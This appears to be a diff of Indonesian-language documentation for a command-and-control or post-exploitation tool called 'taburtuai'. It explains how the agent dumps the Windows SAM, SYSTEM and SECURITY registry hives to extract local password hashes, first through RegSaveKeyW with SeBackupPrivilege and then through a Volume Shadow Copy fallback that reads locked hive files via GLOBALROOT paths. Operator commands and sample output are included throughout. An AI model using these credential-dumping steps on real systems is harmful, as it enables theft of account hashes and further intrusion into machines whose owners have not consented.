@@ -118,26 +118,79 @@ taburtuai(IP:8000) › files delete 2703886d "C:\Windows\Temp\lsass.dmp" --wait
 ## SAM/SYSTEM/SECURITY Hive Dump
 
 Dump registry hive SAM, SYSTEM, dan SECURITY untuk ekstraksi password hash lokal.
-Tidak butuh LSASS — bisa dilakukan tanpa SeDebugPrivilege.
+Tidak butuh LSASS — bisa dilakukan tanpa `SeDebugPrivilege`.
 
-### Dump Registry Hive
+Agent menggunakan **dua strategi** secara otomatis, fallback jika yang pertama gagal:
+
+| Strategi | Privilege yang dibutuhkan | Kapan dipakai |
+|----------|--------------------------|---------------|
+| **RegSaveKeyW** | `SeBackupPrivilege` (admin/SYSTEM) | Default — paling bersih |
+| **VSS Fallback** | Tidak ada privilege khusus | Otomatis jika RegSaveKeyW gagal |
+
+---
+
+### Strategi 1: RegSaveKeyW (Default)
+
+Menggunakan Windows API `RegSaveKeyW` — cara resmi menyimpan hive registry.
+Membutuhkan `SeBackupPrivilege`, biasanya tersedia saat agent berjalan sebagai admin.
 
 ```
 taburtuai(IP:8000) › creds sam 2703886d --wait
 ```
 
-**Output:**
+**Output (sukses via RegSaveKeyW):**
 ```
 [*] Dumping registry hives...
-[*] Saving SAM hive     → C:\Windows\Temp\sam.hive
-[*] Saving SYSTEM hive  → C:\Windows\Temp\system.hive
-[*] Saving SECURITY hive→ C:\Windows\Temp\security.hive
-[+] Registry hives dumped.
-
-    sam.hive     : 65,536 bytes
-    system.hive  : 12,288,000 bytes
-    security.hive: 262,144 bytes
+[*] Enabling SeBackupPrivilege... OK
+[+] saved HKLM\SAM      → C:\Windows\Temp\sam.save
+[+] saved HKLM\SYSTEM   → C:\Windows\Temp\system.save
+[+] saved HKLM\SECURITY → C:\Windows\Temp\security.save
 ```
+
+---
+
+### Strategi 2: Volume Shadow Copy (VSS) Fallback
+
+Jika `SeBackupPrivilege` tidak tersedia atau `RegSaveKeyW` gagal, agent secara otomatis
+mencoba membaca hive langsung dari **Volume Shadow Copy (VSS snapshot)**.
+
+**Cara kerja VSS fallback:**
+- Windows menyimpan snapshot otomatis disk secara berkala (Restore Points, backup)
+- Snapshot ini bisa diakses via path khusus:
+  ```
+  \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopyN\Windows\System32\config\SAM
+  ```
+- File yang locked di disk biasa dapat dibaca dari snapshot karena sudah tidak di-lock
+- Agent mencoba `HarddiskVolumeShadowCopy64` turun ke `1` — pakai yang paling baru
+- Tidak perlu privilege backup apapun
+
+```
+taburtuai(IP:8000) › creds sam 2703886d --wait
+```
+
+**Output (fallback ke VSS):**
+```
+[*] Dumping registry hives...
+[-] SeBackupPrivilege unavailable: Access is denied.
+[-] RegSaveKeyW failed for all hives
+[*] trying VSS fallback …
+[*] using HarddiskVolumeShadowCopy3
+[+] copied SAM      → C:\Windows\Temp\sam.vss
+[+] copied SYSTEM   → C:\Windows\Temp\system.vss
+[+] copied SECURITY → C:\Windows\Temp\security.vss
+```
+
+**Kapan VSS tersedia:**
+- Windows 10/11 dengan System Protection aktif (default)
+- Windows Server dengan backup terjadwal
+- Jika `vssadmin list shadows` (dijalankan sebagai admin) menampilkan daftar shadow copy
+
+**Kapan VSS tidak tersedia:**
+- VSS dinonaktifkan (Group Policy atau endpoint hardening)
+- Disk terlalu kecil / System Protection off
+- VM yang tidak pernah membuat restore point
+
+---
 
 ### Ke Direktori Kustom
 
